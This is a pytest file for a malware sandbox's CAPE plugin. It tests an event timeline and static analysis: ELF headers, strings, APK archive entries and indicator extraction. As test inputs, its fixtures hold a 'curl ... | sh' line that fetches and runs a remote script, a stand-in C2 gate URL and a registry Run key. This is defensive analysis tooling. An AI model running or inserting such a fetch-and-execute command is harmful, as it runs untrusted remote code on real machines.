"""The timeline (cape_plugin/timeline.py) and the static facts beside PE
(cape_plugin/static.py: ELF, and any file's strings, archive and text) --
what the platform's Timeline and Static tabs read."""
from __future__ import annotations

import gzip
import json
import sys
import zipfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

import importlib  # noqa: E402

from sandboxd.guests import TargetOs  # noqa: E402

# The module, not the plugin function `plugins/__init__` binds under its name.
cape_analysis = importlib.import_module("sandboxd.postprocessing.plugins.cape_analysis")
from sandboxd.postprocessing.plugins.cape_plugin import static, timeline  # noqa: E402
from sandboxd.postprocessing.plugins.plugin_base import (  # noqa: E402
    CapeConfigSection, PostprocessContext, PostprocessingConfig)
from sandboxd.tests.test_cape_split import BASE, create, rec, write_trace  # noqa: E402


def _rows(job: Path) -> list[dict]:
    with gzip.open(job / timeline.TIMELINE_LOG) as f:
        return [json.loads(line) for line in f]


def test_the_timeline_is_every_plugins_records_of_the_sample_in_time_order(tmp_path):
    job = write_trace(
        tmp_path, *BASE, create(0x10, 100, 200),
        rec("filetracer", 0x11, 100, method="NtWriteFile", FileName="\\??\\C:\\out.txt", FileHandle="0x60"),
        rec("apimon", 0x12, 200, Event="api_called", Method="CreateMutexW", ReturnValue="0x2d8",
            Arguments=["lpMutexAttributes=0x0", "bInitialOwner=0x0", 'lpName=0x1:"OnlyOne"']),
        # Records no call holds: the sample's memdump, and one of a process
        # that is not the sample's, which stays out
        rec("memdump", 0x13, 200, method="NtWriteVirtualMemory", DumpReason="Write heuristic",
            DumpPID=200, DumpAddr="0x400000", DumpSize="0x1000", DumpFilename="400000_ab"),
        rec("memdump", 0x14, 50, method="NtWriteVirtualMemory", DumpReason="the guest's own",
            DumpPID=50, DumpAddr="0x1", DumpSize="0x1", DumpFilename="1_cd"))
    context = PostprocessContext(job, PostprocessingConfig(), TargetOs.WINDOWS)
    cape_analysis.run_cape(context, CapeConfigSection(capa=False, signatures=False, compress_trace=False))

    rows = _rows(job)
    index = json.loads((job / timeline.TIMELINE_INDEX).read_text())
    assert index["count"] == len(rows) and index["chunks"][0][:3][2] == 0
    plugins = {r["plugin"] for r in rows}
    assert {"inject", "memdump", "apimon"} <= plugins
    assert "the guest's own" not in json.dumps(rows)
    # In time order, across processes
    times = [float(r["ts"]) for r in rows if r["ts"]]
    assert times == sorted(times)
    # A call's row names its place in its process's calls: the cid the
    # platform opens it by
    calls = json.loads((job / cape_analysis.CALLS_INDEX).read_text())["processes"]
    mutex = next(r for r in rows if r["name"] == "CreateMutexW")
    assert str(mutex["seqid"]) in calls and mutex["cid"] is not None
    assert "lpName=OnlyOne" in mutex["text"] and "0x2d8" not in mutex["text"]
    memdump = next(r for r in rows if r["plugin"] == "memdump")
    assert memdump["pid"] == 200 and "400000_ab" in memdump["text"]
    # Members end to end, rows numbered without gaps
    end, first = 0, 0
    for offset, length, row, _ts, _seqids in index["chunks"]:
        assert offset == end and row == first
        end, first = offset + length, row + timeline.TIMELINE_PER_CHUNK


def test_a_failed_timeline_costs_the_timeline_not_the_report(tmp_path, monkeypatch):
    job = write_trace(tmp_path, *BASE, rec("apimon", 0x12, 100, Event="api_called", Method="Sleep",
                                          ReturnValue="0x0"))

    def broken(*args, **kwargs):
        (job / timeline.TIMELINE_LOG).write_bytes(b"half")
        raise OSError("disk full")
    monkeypatch.setattr(cape_analysis, "write_timeline", broken)
    context = PostprocessContext(job, PostprocessingConfig(), TargetOs.WINDOWS)
    cape_analysis.run_cape(context, CapeConfigSection(capa=False, signatures=False, compress_trace=False))
    assert (job / cape_analysis.CAPE_RESULTS).exists()
    assert not (job / timeline.TIMELINE_LOG).exists() and not (job / timeline.TIMELINE_INDEX).exists()


def test_a_rows_text_keeps_what_a_reader_searches_for():
    text = timeline.call_text([
        {"name": "Handle", "value": "0x7ffa544cfe94"}, {"name": "Size", "value": "4096"},
        {"name": "FileName", "value": "C:\\Users\\u\\upd.exe"},
        {"name": "remoteip", "value": "203.0.113.7"}, {"name": "remoteport", "value": "0x1bb"},
        {"name": "localport", "value": "0x0"}, {"name": "Flags", "value": 3}])
    assert text == "FileName=C:\\Users\\u\\upd.exe remoteip=203.0.113.7 remoteport=443"


def test_a_record_is_the_sample_s_when_it_or_its_target_is():
    owner = timeline._Owner([{"seqid": 1, "process_id": 200, "started_ts": 10.0, "exited_ts": None},
                             {"seqid": 2, "process_id": 300}], sample={1, 2})
    # memdump of the sample's memory by a process that is not the sample's
    row = timeline._aux_row("memdump", {"TimeStamp": "12.0", "PID": 4, "DumpPID": 200,
                                        "DumpReason": "remote write"}, owner)
    assert row[1]["seqid"] == 1
    assert timeline._aux_row("memdump", {"TimeStamp": "12.0", "PID": 4, "DumpPID": 5}, owner) is None
    # The kernel's are kept whole
    kernel = timeline._aux_row("rootkitmon", {"TimeStamp": "1.0", "Type": "ssdt", "Message": "x"}, owner)
    assert kernel[1]["seqid"] is None and "Message=x" in kernel[1]["text"]


# --- static ---------------------------------------------------------------------

def test_an_elf_reads_as_capes_parse_elf_names_it():
    exe = Path(sys.executable).resolve()
    if exe.read_bytes()[:4] != b"\x7fELF":
        pytest.skip("the interpreter is not an ELF here")
    elf = static.elf_info(exe)
    assert set(elf) >= {"file_header", "section_headers", "program_headers", "dynamic_tags",
                        "symbol_tables", "notes"}
    assert elf["file_header"]["magic"] == "\\x7fELF"
    assert elf["file_header"]["entry_point_address"].startswith("0x")
    assert any(s["name"] == ".text" and s["entropy"] for s in elf["section_headers"]) or elf["stripped"]
    assert elf["linking"] in ("dynamic", "static")
    assert len(elf["symbol_tables"]) <= static.MAX_SYMBOLS


def test_what_is_not_an_elf_has_no_elf_part(tmp_path):
    (tmp_path / "x").write_bytes(b"MZ" + b"\x00" * 100)
    assert static.elf_info(tmp_path / "x") == {}
    (tmp_path / "y").write_bytes(b"\x7fELF" + b"\xff" * 12)
    assert static.elf_info(tmp_path / "y") == {}


def test_any_file_gets_its_strings_indicators_archive_and_text(tmp_path):
    apk = tmp_path / "x.apk"
    with zipfile.ZipFile(apk, "w") as z:
        z.writestr("AndroidManifest.xml", b"\x03\x00")
        z.writestr("classes.dex", b"dex\n035\x00 http://c2.example/gate.php")
    facts = static.file_static(apk)
    assert facts["archive"]["kind"] == "APK" and facts["archive"]["count"] == 2
    assert [e["name"] for e in facts["archive"]["entries"]] == ["AndroidManifest.xml", "classes.dex"]
    assert "text" not in facts

    script = tmp_path / "x.sh"
    script.write_bytes(b"#!/bin/sh\ncurl -s http://198.51.100.4:8080/p.sh | sh # (http://x.example/a)\n")
    facts = static.file_static(script)
    assert facts["text"].startswith("#!/bin/sh") and not facts["text_truncated"]
    iocs = {(i["kind"], i["value"]) for i in facts["iocs"]}
    assert ("url", "http://198.51.100.4:8080/p.sh") in iocs and ("ip", "198.51.100.4:8080") in iocs
    # A closing bracket is the text around a URL, not the URL
    assert ("url", "http://x.example/a") in iocs
    assert 0 < float(facts["entropy"]) < 8

    wide = tmp_path / "w.bin"
    wide.write_bytes(b"\x00\x01" + "HKEY_CURRENT_USER\\Software\\Run".encode("utf-16-le") + b"\x00\x00")
    facts = static.file_static(wide)
    assert "HKEY_CURRENT_USER\\Software\\Run" in facts["strings"]
    assert ("registry", "HKEY_CURRENT_USER\\Software\\Run") in {(i["kind"], i["value"]) for i in facts["iocs"]}


def test_the_strings_kept_are_bounded_and_the_total_is_not(tmp_path):
    many = tmp_path / "many"
    many.write_bytes(b"\x00".join(b"string%06d" % i for i in range(static.MAX_STRINGS + 50)))
    facts = static.file_static(many)
    assert len(facts["strings"]) == static.MAX_STRINGS
    assert facts["strings_total"] == static.MAX_STRINGS + 50
